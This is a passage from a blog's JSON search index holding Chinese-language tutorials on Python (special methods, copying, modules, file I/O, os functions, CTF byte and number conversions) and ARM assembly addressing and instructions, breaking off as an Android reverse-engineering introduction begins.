obj.eat()\nfun(Cat())\nfun(Dog())\nfun(Animal())\nfun(Person())\n'''\n猫吃鱼\n狗吃骨头\n动物会吃\n人吃五谷杂粮\n'''\n```\n\n## 19.7 特殊的属性和方法\n\n|          | 名称           | 描述                                                         |\n| -------- | -------------- | ------------------------------------------------------------ |\n| 特殊属性 | \\_\\_dict\\_\\_   | 获得类对象或实例对象所绑定的所有属性和方法的字典             |\n| 特殊方法 | \\_\\_len_\\_()   | 通过重写\\_\\_len()\\_\\_方法，让内置函数len()的参数可以是自定义类型 |\n|          | \\_\\_add_\\_()   | 通过重写\\_\\_add\\_\\_()方法，可使用自定义对象具有“+”功能       |\n|          | \\_\\_new\\_\\_()  | 用于创建对象                                                 |\n|          | \\_\\_init\\_\\_() | 对创建的对象进行初始化                                       |\n\n```python\nclass A:\n    pass\nclass B:\n    pass\nclass C(A,B):\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\nclass D(A):\n    pass\n\n#创建C类的对象\nx = C('Jack',20)\nprint(x.__dict__)\t#实例对象的属性字典\nprint(C.__dict__)\t#类对象的方法字典\nprint(x.__class__)\t#输出了对象所属的类\nprint(C.__bases__)\t#输出C类类型的元素\nprint(C.__base__)\t#输出第一个父类的元素\nprint(C.__mro__)\t#查看类的层次结构\nprint(A.__subclasses__())\t#输出子类的列表\n'''\n{'name': 'Jack', 'age': 20}\n{'__module__': '__main__', '__init__': <function C.__init__ at 0x000002805E552AF8>, '__doc__': None}\n<class '__main__.C'>\n(<class '__main__.A'>, <class '__main__.B'>)\n<class '__main__.A'>\n(<class '__main__.C'>, <class '__main__.A'>, <class '__main__.B'>, <class 'object'>)\n[<class '__main__.C'>, <class '__main__.D'>]\n'''\n```\n\n```python\na = 20\nb = 100\nc = a + b\nd = a.__add__(b)\nprint(c)\nprint(d)\n\nclass Student:\n    def __init__(self, name):\n        self.name = name\n    def __add__(self, other):\n        return self.name + other.name\n    def __len__(self):\n        return len(self.name)\n        \nstu1 = Student('v5le0n9')\nstu2 = Student('李四')\ns = stu1 + stu2\nprint(s)\ns = stu1.__add__(stu2)\nprint(s)\n\nlst = [22,33,44,11]\nprint(len(lst))\nprint(lst.__len__())\nprint(len(stu1))\n'''\n120\n120\nv5le0n9李四\nv5le0n9李四\n4\n4\n7\n'''\n```\n\n```python\nclass Person():\n    def __new__(cls, *args, **kwargs):\n        print('__new__被调用执行了，cls的id值为{0}'.format(id(cls)))\n        obj = super().__new__(cls)\n        print('创建的对象的id为：{0}'.format(id(obj)))\n        return obj\n    \n    def __init__(self,name,age):\n        print(\"__init__被调用执行了，self的id值为{0}\".format(id(self)))\n        self.name = name\n        self.age = age\n\nprint(\"object类对象的id为：{0}\".format(id(object)))\nprint(\"Person类对象的id为：{0}\".format(id(Person)))\n\n#创建Person类的实例对象\np1 = Person('张三', 20)\t#创建对象会执行__new__()和__init__(),将__init__()返回给p1\nprint('p1这个Person类的实例对象的id为：{0}'.format(id(p1)))\n'''\nobject类对象的id为：140736155446064\nPerson类对象的id为：1253089495272\n__new__被调用执行了，cls的id值为1253089495272\n创建的对象的id为：1253119249672\n__init__被调用执行了，self的id值为1253119249672\np1这个Person类的实例对象的id为：1253119249672\n'''\n```\n\n## 19.8 类的浅拷贝与深拷贝\n\n变量的赋值操作：只是形成两个变量，实际上还是指向同一个对象。\n\n浅拷贝：Python拷贝一般都是浅拷贝，拷贝时，对象包含的子对象内容不拷贝，因此，原对象与拷贝对象会引用同一个子对象。\n\n深拷贝：使用copy模块的deepcopy函数，递归拷贝对象中包含的子对象，原对象和拷贝对象所有的子对象也不相同。\n\n```python\nclass CPU:\n    pass\nclass Disk:\n    pass\nclass Computer:\n    def __init__(self, cpu, disk):\n        self.cpu = cpu\n        self.disk = disk\n\n#变量的赋值\ncpu1 = CPU()\ncpu2 = cpu1\nprint(cpu1, id(cpu1))\nprint(cpu2, id(cpu2))\n\n#类的浅拷贝\ndisk = Disk()\ncomputer = Computer(cpu1, disk)\nimport copy\ncomputer2 = copy.copy(computer)\nprint(computer,computer.cpu,computer.disk)\nprint(computer2,computer2.cpu,computer2.disk)\n'''\n<__main__.CPU object at 0x0000021A6ADE6348> 2312485364552\n<__main__.CPU object at 0x0000021A6ADE6348> 2312485364552\n<__main__.Computer object at 0x0000021A6ADE8148> <__main__.CPU object at 0x0000021A6ADE6348> <__main__.Disk object at 0x0000021A6ADE4EC8>\n<__main__.Computer object at 0x0000021A6ADE8488> <__main__.CPU object at 0x0000021A6ADE6348> <__main__.Disk object at 0x0000021A6ADE4EC8>\n'''\n```\n\n```python\nclass CPU:\n    pass\nclass Disk:\n    pass\nclass Computer:\n    def __init__(self, cpu, disk):\n        self.cpu = cpu\n        self.disk = disk\n\ncpu1 = CPU()        \ndisk = Disk()\ncomputer = Computer(cpu1, disk)\n#类的深拷贝\nimport copy\ncomputer3 = copy.deepcopy(computer)\nprint(computer,computer.cpu,computer.disk)\nprint(computer3,computer3.cpu,computer3.disk)\n'''\n<__main__.Computer object at 0x000001D8BF2B54C8> <__main__.CPU object at 0x000001D8BDAE2848> <__main__.Disk object at 0x000001D8BF2B4CC8>\n<__main__.Computer object at 0x000001D8BF2B69C8> <__main__.CPU object at 0x000001D8BF2B6688> <__main__.Disk object at 0x000001D8BF2B6508>\n'''\n```\n\n# 20. 模块\n\n使用模块的好处：\n\n- 方便其他程序和脚本的导入并使用\n- 避免函数名和变量名冲突\n- 提高代码的可维护性\n- 提高代码的可重用性\n\n## 20.1 模块的导入\n\n```python\nimport math\nprint(id(math))\nprint(type(math))\nprint(math)\nprint(math.pi)\nprint(dir(math))\nprint(math.pow(2,3))\nprint(math.ceil(9.001))\t#向上取整\nprint(math.floor(9.999))\t#向下取整\n'''\n1512215034680\n<class 'module'>\n<module 'math' (built-in)>\n3.141592653589793\n['__doc__', '__loader__', '__name__', '__package__', '__spec__', 'acos', 'acosh', 'asin', 'asinh', 'atan', 'atan2', 'atanh', 'ceil', 'copysign', 'cos', 'cosh', 'degrees', 'e', 'erf', 'erfc', 'exp', 'expm1', 'fabs', 'factorial', 'floor', 'fmod', 'frexp', 'fsum', 'gamma', 'gcd', 'hypot', 'inf', 'isclose', 'isfinite', 'isinf', 'isnan', 'ldexp', 'lgamma', 'log', 'log10', 'log1p', 'log2', 'modf', 'nan', 'pi', 'pow', 'radians', 'remainder', 'sin', 'sinh', 'sqrt', 'tan', 'tanh', 'tau', 'trunc']\n8.0\n10\n9\n'''\n```\n\n```python\nfrom math import pi\nprint(pi)\n'''\n3.141592653589793\n'''\n```\n\n```python\n#calc.py\ndef add(a, b):\n    return a + b\ndef div(a, b):\n    return a / b\n```\n\n```python\nimport calc\nprint(calc.add(10,20))\nprint(calc.div(4, 2))\n```\n\n## 20.2 以主程序形式运行\n\n在每个模块的定义中都包括一个记录模块名称的变量\\_\\_name\\_\\_，程序可以检查该变量，以确定它们在哪个模块中运行。如果一个模块不是被导入到其它程序中执行，那么他可能在解释器的顶级模块中执行。顶级模块的\\_\\_name\\_\\_变量的值为\\_\\_main\\_\\_。\n\n```python\n#calc2.py\ndef add(a, b):\n    return a + b\nprint(add(10,20))\n```\n\n```python\nimport calc2\nprint(calc2.add(100,200))\n'''\n30\n300\n'''\n```\n\n```python\n#calc2.py\ndef add(a, b):\n    return a + b\n\nif __name__ == '__main__':\n    print(add(10,20))\t#只有当点击运行calc2.py时才运行\n```\n\n```python\nimport calc2\nprint(calc2.add(100,200))\n'''\n300\n'''\n```\n\n## 20.3 包\n\n包是一个分层次的目录结构，它将一组功能相近的模块组织在一个目录下。\n\n作用：代码规范，避免模块名称冲突。\n\n包与目录的区别：\n\n- 包含`__init__.py`文件的目录称为包\n- 目录里通常不包含`__init__.py`文件\n\n包的导入：\n\n```python\nimport 包名.模块包\n```\n\n`package1`包中有`module_A.py`模块：\n\n```python\na = 10\n```\n\n有`module_B.py`模块：\n\n```python\nb = 100\n```\n\n在另一个模块中导入`package1`包。\n\n```python\nimport package1.module_A as ma\t#as后面的是别名\nprint(package1.module_A.a)\nprint(ma.a)\n```\n\n```python\nfrom package1 import module_A\t#导入模块\nfrom package1.module_A import a\t#导入变量\n```\n\n## 20.4 常用的内置模块\n\n| 模块名   | 描述                                                         |\n| -------- | ------------------------------------------------------------ |\n| sys      | 与Python解释器及其环境操作相关的标准库                       |\n| time     | 提供与时间相关的各种函数的标准库                             |\n| os       | 提供了访问操作系统服务功能的标准库                           |\n| calendar | 提供与日期相关的各种函数的标准库                             |\n| urllib   | 用于读取来自网上的数据标准库                                 |\n| json     | 用于使用JSON序列化和反序列化对象                             |\n| re       | 用于在字符串中执行正则表达式匹配和替换                       |\n| math     | 提供标准算数运算函数的标准库                                 |\n| decimal  | 用于进行精确控制运算精度、有效数位和四舍五入操作的十进制运算 |\n| logging  | 提供了灵活的记录事件、错误、警告和调试信息等日志信息的功能   |\n\n```python\nimport sys\nprint(sys.getsizeof(24))\nprint(sys.getsizeof(45))\nprint(sys.getsizeof(True))\nprint(sys.getsizeof(False))\n'''\n28\n28\n28\n24\n'''\n```\n\n```python\nimport time\nprint(time.time())\nprint(time.localtime(time.time()))\n'''\n1647265802.3989463\ntime.struct_time(tm_year=2022, tm_mon=3, tm_mday=14, tm_hour=21, tm_min=50, tm_sec=2, tm_wday=0, tm_yday=73, tm_isdst=0)\n'''\n```\n\n```python\nimport urllib.request\nprint(urllib.request.urlopen('https://v5le0n9.github.io/').read())\n```\n\n# 21. 编码格式与文件读写\n\n## 21.1 编码格式\n\nPython的解释器使用的是Unicode(内存)，`.py`文件在磁盘上使用UTF-8存储(外存)。\n\n```python\n#默认为UTF-8编码\nprint(\"哈哈哈哈哈哈\")\n```\n\n设置为GBK编码：\n\n```python\n#encoding = gbk\nprint('哈哈哈哈哈哈')\n```\n\n## 21.2 文件读写原理\n\n```python\nfile = open('a.txt', 'r')\nprint(file.readlines())\nfile.close()\n#每行的结果放在一个列表中\n```\n\n## 21.3 常用的文件打开模式\n\n文件的类型：按文件中数据的组织形式，文件分为文本文件和二进制文件。\n\n- 文本文件：存储的是普通“字符”文本，默认为Unicode字符集，可以使用记事本程序打开。\n- 二进制文件：把数据内容用“字节”进行存储，无法用记事本打开，必须使用专用的软件打开。比如mp3音频文件，jpg图片，doc文档等。\n\n| 打开模式 | 描述                                                         |\n| -------- | ------------------------------------------------------------ |\n| r        | 以只读模式打开文件，文件的指针将会放在文件的开头             |\n| w        | 以只写模式打开文件，如果文件不存在则创建，如果文件存在，则覆盖原有内容，文件指针在文件的开头 |\n| a        | 以追加模式打开文件，如果文件不存在则创建，文件指针在文件开头，如果文件存在，则在文件末尾追加内容，文件指针在原文件末尾 |\n| b        | 以二进制方式打开文件，不能单独使用，需要与其它模式一起使用，rb或wb |\n| +        | 以读写方式打开文件，不能单独使用，需与其它模式一起使用，a+   |\n\n```python\nfile = open('b.txt', 'w')\nfile.write('Python')\nfile.close()\n\nfile = open('b.txt', 'a')\nfile.write('Python')\nfile.close()\n```\n\n```python\nsrc_file = open('logo,png', 'rb')\ntarget_file = open('copylogo.png', 'wb')\nprint(target_file.write(src_file.read()))\ntarget_file.close()\nsrc_file.close()\n```\n\n## 21.4 文件对象的常用方法\n\n| 方法名                 | 说明                                                         |\n| ---------------------- | ------------------------------------------------------------ |\n| read([size])           | 从文件中读取size个字节或字符的内容返回，若省略[size]，则读取到文件末尾，即一次读取文件所有内容 |\n| readline()             | 从文本文件中读取一行内容                                     |\n| readlines()            | 把文本文件中每一行都作为独立的字符串对象，并将这些对象放入列表返回 |\n| write(str)             | 将字符串str内容写入文件                                      |\n| writelines(s_list)     | 将字符串列表s_list写入文本文件，不添加换行符                 |\n| seek(offset [,whence]) | 把文件指针移动到新的位置，offset表示相对于whence的位置：offset：为正往结束方向移动，为负往开始方向移动。<br />whence不同的值代表不同含义：<br />0：从文件头开始计算（默认值）<br />1：从当前位置开始计算<br />2：从文件尾开始计算 |\n| tell()                 | 返回文件指针的当前位置                                       |\n| flush()                | 把缓冲区的内容写入文件，但不关闭文件                         |\n| close()                | 把缓冲区的内容写入文件，同时关闭文件，释放文件对象相关资源   |\n\n```python\nfile = open('a.txt', 'r')\nprint(file.read(2))\nprint(file.readline())\nprint(file.readlines())\nfile.close()\n```\n\n```python\nfile = open('c.txt', 'a')\nfile.write('hello')\nlst = ['Java', 'Python']\nfile.writelines(lst)\nfile.close()\n```\n\n```python\nfile = open('a.txt', 'r')\nfile.seek(2)\nprint(file.read())\nprint(file.tell())\nfile.close()\n```\n\n```python\nfile = open('c.txt', 'a')\nfile.write('hello')\nfile.flush()\nfile.write('world')\nfile.close()\n```\n\n## 21.5 with语句\n\nwith语句可以自动管理上下文资源，不论什么么原因跳出with块，都能确保文件正确的关闭，以此来达到释放资源的目的。\n\n```python\nwith open('a.txt', 'r') as file:\n    print(file.read())\n```\n\n```python\n'''\nMyContentMgr实现了特殊方法：__enter__(),__exit__()称为该类对象遵守了上下文管理器协议\n该类对象的实例对象，成为上下文管理器\n'''\nclass MyContentMgr(object):\n    def __enter__(self):\n        print('enter方法被调用执行了')\n        return self\n    def __exit__(self,exc_type,exc_val,exc_tb):\n        print(\"exit方法被调用执行了\")\n    def show(self):\n        print(\"show方法被调用执行了\")\nwith MyContentMgr() as file:\n    file.show()\n'''\nenter方法被调用执行了\nshow方法被调用执行了\nexit方法被调用执行了\n'''\n```\n\n```python\nwith open('logo.png', 'rb') as src_file:\n    with open('copy2logo.png', 'wb') as target_file:\n        target_file.write(src_file.read())\n```\n\n## 21.6 os模块的常用函数\n\nos模块是Python内置的与操作系统功能和文件系统相关的模块，该模块中的语句的执行结果通常与操作系统有关，在不同的操作系统上运行，得到的结果可能不一样。\n\nos模块与os.path模块用于对目录或文件进行操作。\n\n```python\nimport os\nos.system('notepad.exe')\nos.system('calc.exe')\n\n#直接调用可执行文件\nos.startfile(r'D:\\CTF\\tools\\IDA_Pro_v7.5\\ida.exe')\n```\n\n| 函数                            | 说明                           |\n| ------------------------------- | ------------------------------ |\n| getcwd()                        | 返回当前的工作目录             |\n| listdir(path)                   | 返回指定路径下的文件和目录信息 |\n| mkdir(path [,mode])             | 创建目录                       |\n| makedirs(path1/path2...[,mode]) | 创建多级目录                   |\n| rmdir(path)                     | 删除目录                       |\n| removedirs(path1/path2...)      | 删除多级目录                   |\n| chdir(path)                     | 将path设置为当前工作目录       |\n\n```python\nimport os\nprint(os.getcwd())\nlst = os.listdir('../chap15')\nprint(lst)\nos.mkdir('newdir2')\nos.makedirs('A/B/C')\nos.rmdir('newdir2')\nos.removedirs('A/B/C')\nos.chdir('E:\\\\vipp')\nprint(os.getcwd())\n```\n\n## 21.7 os.path模块操作目录相关函数\n\n| 函数            | 说明                                                        |\n| --------------- | ----------------------------------------------------------- |\n| abspath(path)   | 用于获取文件或目录的绝对路径                                |\n| exists(path)    | 用于判断文件或目录是否存在，如果存在返回True，否则返回False |\n| join(path,name) | 将目录与目录或者文件名拼接起来                              |\n| splitext()      | 分离文件名和扩展名                                          |\n| basename(path)  | 从一个目录中提取文件名                                      |\n| dirname(path)   | 从一个路径中提取文件路径，不包括文件名                      |\n| isdir(path)     | 用于判断是否为路径                                          |\n\n```python\nimport os.path\nprint(os.path.abspath('hello.py'))\nprint(os.path.exists('hello.py'), os.path.exists('v5le0n9.py'))\nprint(os.path.join('E:\\\\Python','demo13.py'))\nprint(os.path.split('E:\\\\Python\\\\demo13.py'))\nprint(os.path.splitext('demo13.py'))\nprint(os.path.basename('E:\\\\Python\\\\demo13.py'))\nprint(os.path.dirname('E:\\\\Python\\\\demo13.py'))\nprint(os.path.isdir('E:\\\\Python\\\\demo13.py'))\n```\n\n```python\n#列出指定目录下的所有py文件\nimport os\npath = os.getcwd()\nlst = os.listdir(path)\nfor filename in lst:\n    if filename.endswith('.py'):\n        print(filename)\n'''\nmodule1.py\nmodule2.py\nPythonApplication1.py\n'''\n```\n\n```python\nimport os\npath = os.getcwd()\nlst_files = os.walk(path)\nprint(lst_files)\nfor dirpath,dirname,filename in lst_files:\n    '''\n    print(dirpath)\n    print(dirname)\n    print(filename)\n    '''\n    for dir in dirname:\n        print(os.path.join(dirpath,dir))\n    for file in filename:\n        print(os.path.join(dirpath,file))\n```\n\n# 22. CTF中常用字符转换\n\n## 22.1 整数之间的进制转换\n\n```python\nprint(hex(11111))\t\t\t\t# 0x2b67\nprint(int(hex(11111),16))\t\t# 11111\nprint(oct(11111))\t\t\t\t# 0o25547\nprint(int(oct(11111),8))\t\t# 11111\nprint(hex(int(oct(11111),8)))\t# 0x2b67\n# 进制之间不能跳过十进制互相转换\t\n# print(bin(oct(11111),8))\nprint(bin(11111))\t\t\t\t# 0b10101101100111\nprint(int(bin(11111),2))\t\t# 11111\n```\n\n## 22.2 字符串转整数\n\n```python\nprint(int('23333'))\t\t\t\t# 23333\nprint(int('23333',16))\t\t\t# 144179\nprint(int('0x23333',16))\t\t# 144179\nprint(int('23333',8))\t\t\t# 9947\n```\n\n## 22.3 整数与字节串之间的转换\n\n```python\n# 字节串转整数\n# 大端法\nprint(int.from_bytes(b'y\\xcc\\xa6\\xbb',byteorder='big'))\t# 2043455163\n\n# 小端法\nprint(int.from_bytes(b'y\\xcc\\xa6\\xbb',byteorder='little'))\t# 3148270713\n\n# 导入struct包\nimport struct\n# 默认转化成元组形式，但只可以包含一个元素\nprint(struct.unpack('>L',b'y\\xcc\\xa6\\xbb'))\t# (2043455163,)\n\n# 取元组下标为0的元素\nprint(struct.unpack('>L',b'y\\xcc\\xa6\\xbb')[0])\t# 2043455163\n\n# 整数转字节串\n# 后面有几个整数就要写多少个格式化字符\nprint(struct.pack('>L',3148270713))\t# b'\\xbb\\xa6\\xccy'\nprint(struct.pack('<LLL',1,2,3))\t# b'\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00'\n```\n\n关于struct包pack和unpack的第一个参数：\n\n{% asset_img struct包.png 特点 %}\n\n{% asset_img struct包2.png 格式 %}\n\n## 22.4 字符串与字节串之间的转换\n\n```python\n# 字符串转字节串\n# 字符串编码为字节码\nprint('v5le0n9'.encode('ascii'))\t# b'v5le0n9'\n\n# 如果有中文用utf-8编码\nprint('v5le0n9哈'.encode('utf-8'))\t# b'v5le0n9\\xe5\\x93\\x88'\n\n# 数字或字符数组编码成字节码\nprint(bytes(1)) \t# b'\\x00'\n# print(bytes(1,2,3))   # 当多个整型转换要先转化为数组\nprint(bytes([1,0xb,ord('3')]))\t# b'\\x01\\x0b3'\n\n# 16进制字符串转字节串\nprint(bytes().fromhex('abcd45')) \t# b'\\xab\\xcdE'\n\n# map(func,iterable)第一个参数表示函数，第二参数表示一个或多个序列\n# 将后面序列都调用前面的函数，最后返回一个迭代器\n# 将这个迭代器里的内容转化为字节串\nprint(bytes(map(ord,'\\x01\\x02\\x31\\x32\\x97\\x98')))\t# b'\\x01\\x0212\\x97\\x98'\n\n# 字节串转字符串\n# 字节码解码为字符串\nprint(bytes(b'v5le0n9\\xe5\\x93\\x88').decode('utf-8'))\t# v5le0n9哈\n\n# 将里面的内容先转为字节串，再转化为字符串，截取下标为2到-1的字符串\nprint(str(bytes(b'\\x01\\x0212'))[2:-1])\t# \\x01\\x0212\n\n# 字节串转16进制，再转字符串，截取下标为2到-1的字符串\nimport binascii\nprint(str(binascii.b2a_hex(b'\\x01\\x0212'))[2:-1])\t# 01023132\n\n# 字节串转16进制，再以字符串的形式插入列表\nprint([hex(x) for x in bytes(b'\\x01\\x0212')])\t# ['0x1', '0x2', '0x31', '0x32']\n```\n\n","categories":["开发"],"tags":["Python"]},{"title":"ARM汇编语言","url":"/posts/6d8340c1.html","content":"\n做题知识不够用，我又来学习了。\n\n<!--more-->\n\nARM指令集机器编码基本格式：\n\n| 31-28  | 27-20  | 19-16      | 15-12         | 11-0    |\n| ------ | ------ | ---------- | ------------- | ------- |\n| 条件码 | 指令码 | 目的寄存器 | 操作数1寄存器 | 操作数2 |\n\n{% asset_img 条件码.png 条件码 %}\n\n# 1. 寻址方式\n\n## 1.1 立即寻址\n\n操作数包含在指令的32位机器编码中。`#`表示立即数。\n\n```asm\nADD R0,R0,#1\t\t;R0 <- R0 + 1\nAND R8,R7,#0xFF\t\t;R8 <- R7 AND 0xFF\n```\n\n问题：32位长立即数的编码问题(合法性问题)\n\n原因：在指令中，立即数作为操作数2出现，编码格式中仅安排了12位，32位立即数不能直接编码。\n\n解决：12位编码包括8位常数和4位循环右移值，由8位常数循环右移4位值的2倍得到最后的32位立即数。\n\n例：MOV R0,#0x0000F200\n\n机器代码：E3A00CF2\n\n机器代码含义：E表示无条件，3A是MOV的机器码，00表示R0寄存器，C是4位循环右移值，F2是8位常数。\n\n方法：0xF2循环右移12*2=24位得到原32位数值\n\n| 移位前： |      |      |      |      |      |      |      |\n| -------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 0000     | 0000 | 0000 | 0000 | 0000 | 0000 | 1111 | 0010 |\n| 移位后： |      |      |      |      |      |      |      |\n| 0000     | 0000 | 0000 | 0000 | 1111 | 0010 | 0000 | 0000 |\n\n## 1.2 寄存器寻址\n\n操作数存放在寄存器中。\n\n### 1.2.1 基本方式\n\n```asm\nADD R0,R1,R2\t;R0 <- R1 + R2\n```\n\n### 1.2.2 对第二操作数寄存器的移位操作\n\n```asm\nADD R3,R2,R1,LSR #2\t\t;R3 <- R2 + R1 / 4\n```\n\n移位方式：\n\n| 移位方式 | 含义                                                         |\n| -------- | ------------------------------------------------------------ |\n| LSL      | 逻辑左移(乘)                                                 |\n| LSR      | 逻辑右移(除)                                                 |\n| ASL      | 算术左移，和LSL一样。类似于小数点移位，左移数变小            |\n| ASR      | 算术右移，分正负来填充右移后的空余位，右移数变大             |\n| ROR      | 循环右移                                                     |\n| RRX      | 带扩展的循环右移，循环右移1位后左端用C填充，这种方式只移位1位，所以无需指定移位位数 |\n\n### 1.2.3 寄存器间接寻址\n\n利用寄存器的值作为存储器指针，数据传送类的load/store类指令都使用寄存器间接寻址方式。\n\n```asm\nLDR R0,[R1]\t\t;R0 <- mem32[R1]\nSTR R0,[R1]\t\t;mem32[R1] <- R0\n```\n\n### 1.2.4 基址加偏移地址\n\n```asm\n前变址\nLDR R0,[R1,#4]\t\t;R0 <- mem32[R1+4]\n\n自动变址\nLDR R0,[R1,#4]!\t\t;R0 <- mem32[R1+4]\n\t\t\t\t\t;R1 <- R1 + 4\n\t\t\t\t\t\n后变址\nLDR R0,[R1],#4\t\t;R0 <- mem32[R1]\n\t\t\t\t\t;R1 <- R1 + 4\n\t\t\n寄存器偏移地址\nLDR R0,[R1,R2]\t\t;R0 <- mem32[R1+R2]\nLDR R0,[R1,R2,LSL #2]\t;R0 <- mem32[R1+R2*4] \n```\n\n## 1.3 多寄存器及块拷贝寻址\n\n一条指令完成多字数据或数据块的传送。\n\n基本指令：LDM/STM\n\n| 基址寄存器变化方式 | 含义               |\n| ------------------ | ------------------ |\n| IA                 | 操作完后地址递增   |\n| IB                 | 地址先增后完成操作 |\n| DA                 | 操作完后地址递减   |\n| DB                 | 地址先减后完成操作 |\n\n多寄存器语法表示：多寄存器用`{}`包含，连续寄存器使用`-`间隔，不连续的用`,`分隔。\n\n例1：\n\n```asm\nLDMID R0,{R1-R4,R6}\t;R1=[R0],R2=[R0+4],...,R6=[R0+16]\n```\n\nR0作为基址寄存器，其值可自动更新：\n\n```asm\nLDMID R0!,{R1-R4,R6}\n```\n\n例2：\n\nLDM指令和STM指令配合实现数据块拷贝：\n\n```asm\nLDMIA R0,{R1-R5}\t;以R0为基址读取五字存储单元数据加载至R1-R5\nSTMIA R6,{R1-R5}\t;将R1-R5中数据依次存入R6为起始地址的存储单元\n```\n\n## 1.4 堆栈寻址\n\n存储空间中的数据栈与寄存器组之间的批量数据传输，采用R13(SP)作为堆栈指针，采用FILO(先进后出)的方式工作，**SP指向栈顶**。\n\n基本指令：LDM/STM\n\n堆栈组织生成方式：\n\nFD/ED：满递减/空递减\n\nFA/EA：满递增/空递增\n\n```asm\nSTMFD SP!,{R0-R7,LR}\t;入栈\nLDMFD SP!,{R0-R7,LR}\t;弹出堆栈\n```\n\n先将LR入栈，最后才是R0入栈；先R0出栈，最后LR出栈。\n\nFD相当于多寄存器寻址的DB。\n\n事实上，堆栈寻址与多寄存器寻址均可操作堆栈，在需要保存特定某些寄存器值时，采用STM进行压栈，采用LDM操作弹出堆栈。\n\n```asm\n保存数据\nSTMDB SP!,{R0-R12,LR}\n\n弹出数据\nLDMIA SP!,{R0-R12,LR}\n```\n\n## 1.5 相对寻址\n\n将程序计数器PC作为基址寄存器，指令中的地址标号字段作为偏移量进行寻址，跳转指令采用相对寻址方式。\n\n# 2. ARM指令集\n\n## 2.1 存储器访问(L/S)指令\n\n常规：\n\n```asm\nLDR R2,[R5]\t\t\t\t;将R5为地址的存储单元中数据加载至R2（读）\nSTR R1,[R0,#0X04]\t\t;mem32[R0+4] <- R1（写）\n```\n\n 传送数据类型：\n\n```asm\nLDRB R3,[R2],#1\t\t;以R2为地址读取1字节数据至R3，R2 = R2 + 1\nSTRH R1,[R0,#2]!\t;半字传送，传送R1中低2字节数据至R0+2为地址的存储单元，R0更新\n```\n\n多寄存器补充：在非用户或系统模式下，可出现`^`后缀，若LDM指令寄存器列表中包含PC，则会额外将SPSR拷贝。\n\n## 2.2 数据处理类指令\n\n### 2.2.1 数据传送指令\n\n```asm\nMOV R1,R0\t\t\t;R1 <- R0\nMOV R1,R0,LSL #3\t;R1 <- R0*8\nMVN R0,#0\t\t\t;立即数0取反传送至R0，R0=-1\n```\n\n### 2.2.2 算数逻辑运算指令\n\n例1：64位整数加法\n\nR0/R1与R2/R3分别存放两个加数的低/高32位，R4/R5存放结果的低/高32位。\n\n```asm\nADDS R4,R0,R2\t;带S后缀结果影响CPSR的标志位C\nADC R5,R1,R3\t;带进位的加法，C标志位参与运算\n```\n\n例2：64位整数减\n\n```ASM\nSUBS R4,R0,R2\nSBC R5,R1,R3\n```\n\n例3：逆向减法\n\n```asm\nRSB R0,R1,R2\t;R0=R2-R1\nRSC R0,R1,R2\t;在上行指令基础上再减C标志位的反码\n```\n\n例4：逻辑运算\n\n```asm\nAND R0,R0,#3\t;保持R0的0、1位，其余清零\nORR R0,R0,#3\t;置位R0的0、1位，其余不变\nEOR R0,R0,#3\t;反转R0的0、1位，其余不变\nBIC R0,R0,#3\t;清零R0的0、1位，其余不变\n```\n\n例5：比较指令\n\n```asm\nCMP R1,R0\t;R1-R0，结果影响CPSR中的标志位，但不保留运算结果\nCMN R0,#1\t;判断R0的值是否为1的补码，是则Z置位\n;CMN指令将操作1寄存器减去操作数2的负值\n```\n\n例6：测试指令\n\n```asm\nTST R1,#3\t;按位与，结果影响CPSR中的标志位\nTEQ R1,R2\t;按位异或，结果影响CPSR中的标志位\n```\n\n上述比较与测试指令可与带S后缀的算数逻辑运算指令对比，如TEQ与EORS对比，其运算操作一致，但运算指令保留结果，比较测试指令只修改CPSR中标志位，不保留运算结果。\n\n例7：乘法指令\n\nMUL：32位乘法\n\nMLA：三操作数乘法，将操作数1与操作数2相乘，结果加第三个操作数，存入目的寄存器\n\n```asm\nMLA Rd,Rm,Rs,Rn\t\t\t;Rd <- Rm*Rs+Rn\n```\n\n规则：Rd和Rm不能是同一寄存器\n\n形成两个矢量的标量积的例子：\n\n```asm\n\tmov r11,#20\t\t\t\t;r11 <- 20\n\tmov r10,#0\t\t\t\t;r10 <- 0\nloop:\n\tldr r0,[r8],#4\t\t\t;r0 <- mem32[r8]\n\t\t\t\t\t\t\t;r8 <- r8 + 4\n\tldr r1,[r9],#4\t\t\t;r1 <- mem32[r9]\n\t\t\t\t\t\t\t;r9 <- r9 + 4\n\tmla r10,r0,r1,r10\t\t;r10 <- r0*r1+r10\n\tsubs r11,r11,#1\t\t\t;r11 <- r11 - 1\n\tbne loop\t\t\t\t;在Z标志位为0时跳转执行\n```\n\n### 2.2.3 数据交换指令\n\n```asm\nSWP R1,R1[R0]\t\t;需要中间人\n```\n\n## 2.3 跳转指令\n\n跳转指令用于控制程序的走向，可完成从当前指令向前或向后的32MB的地址空间跳转，包括基本跳转指令(无条件跳转)B，带返回的跳转指令BL，带状态切换(ARM与Thumb之间)的跳转指令BX，带返回和状态切换的跳转指令BLX。\n\nARM指令地址间隔为4，Thumb指令地址间隔为2。\n\n例：\n\n```asm\nBL LABEL\t;程序无条件跳转至LABEL处执行\n\t\t\t;同时将当前的PC值保存至R14中\n\n用B指令完成类似功能\nMOV LR,PC\nB LABEL\n```\n\n跳转范围不受限制的方式：\n\n```asm\nLDR PC,=LABEL\n```\n\nBEQ：相等就跳\n\nNEQ：不相等就跳\n\n## 2.4 程序状态寄存器访问指令\n\n当前程序状态寄存器可分为4个8位独立域：\n\n```asm\nCPSR[31:24]：_f(标志域)\nCPSR[23:16]：_s(状态域)\nCPSR[15:8]：_x(扩展域)\nCPSR[7:0]：_c(控制域)\n```\n\n例：清CPSR标志位，先读到寄存器里去再进行修改，修改完后用MSR指令赋值给标志位。\n\n```asm\nMRS R0,CPSR\t\t;R0 <- CPSR\nBIC R0,R0,#0xF0000000\t;清高四位\nMSR CPSR_f,R0\t\t;CPSR_f <- R0\n```\n\n","categories":["Android逆向"],"tags":["汇编","Reverse"]},{"title":"Android逆向入门教程","url":"/posts/15be101a.html","content":"\n# 1. 初识APK、Dalvik字节码以及Smali\n\n后缀名为`.apk`是安卓手机app的格式。它的实质是一个ZIP压缩包，将它的后缀名修改为`.zip`便可以看到内部的文件结构。解压出来后一般有以下文件：\n\n<!--more-->\n\n| 文件                | 作用                                                         |\n| ------------------- | ------------------------------------------------------------ |\n| asset文件夹         | 资源目录1，asset和res都是资源目录但有所区别                  |\n| lib文件夹           | 